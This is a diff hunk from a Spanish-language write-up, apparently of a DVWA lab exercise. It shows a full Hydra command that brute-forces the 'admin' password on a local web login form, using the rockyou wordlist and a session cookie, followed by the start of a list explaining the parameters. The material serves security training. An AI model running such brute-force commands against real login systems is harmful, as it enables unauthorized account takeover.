@@ -21,7 +21,7 @@ Para evadir el retraso y obtener la contraseña del usuario `admin`, se utilizó
 ### Comando Utilizado:
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
-
+```
 ### Parámetros Técnicos
 
 -l admin --> Define el usuario objetivo.
